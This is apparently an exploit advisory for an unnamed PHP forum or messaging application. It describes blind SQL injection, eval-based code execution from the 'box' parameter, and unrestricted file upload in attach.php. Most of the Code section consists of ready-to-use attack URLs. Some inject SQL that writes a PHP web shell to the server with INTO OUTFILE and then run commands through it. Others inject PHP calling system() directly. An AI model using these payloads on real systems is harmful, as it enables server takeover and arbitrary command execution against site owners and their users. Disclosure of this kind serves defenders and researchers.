[+] Bugs


- [A] Multiple Blind SQL Injection

[-] Risk: medium
[-] Requisites: magic_quotes_gpc = off
[-] File affected: almost all of the files are
vulnerable

This bug allows a guest to execute arbitrary SQL
queries.


- [B] Multiple Dynamic Code Execution

[-] Risk: hight
[-] File affected: almost all of the files are
vulnerable

This bug allows a guest to execute arbitrary php
code.

...

if ($_GET['box']) {
$folder = $_GET['box'];
}

...

$ddata[] = ucwords($folder);

...

eval (" ?> ".str_replace($cdata, $ddata, stripslashes(template($view."_header")))." <?php ");

...


- [C] Arbitrary File Upload

[-] Risk: hight
[-] File affected: attach.php

This bug allows a registered user to upload
arbitrary files and to execute them from
inc/attachments directory. This is possible
because there are no controls on file extension
on the server side but only on the client side.

[+] Code


- [A] Multiple Blind SQL Injection

http://site/path/inc/attach.php?id=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23

http://site/path/index.php?do=profile&user=blabla&box=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23

http://site/path/index.php?do=messages&user=blabla&box=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23

http://site/path/index.php?do=edit_post&id=-1' UNION ALL SELECT '<?php system($_GET[cmd])%3b ?>',2,3,4,5,6,7,8,9 INTO OUTFILE '/var/www/htdocs/path/rce.php'%23

To execute commands:

http://site/path/rce.php?cmd=uname -a


- [B] Multiple Dynamic Code Execution

http://www.site.com/path/index.php?do=profile&user=blabla&box=<?php echo "<pre>"; system('ls'); echo "</pre>"?>

http://www.site.com/path/index.php?do=messages&user=blabla&box=<?php echo "<pre>"; system('ls'); echo "</pre>"?>
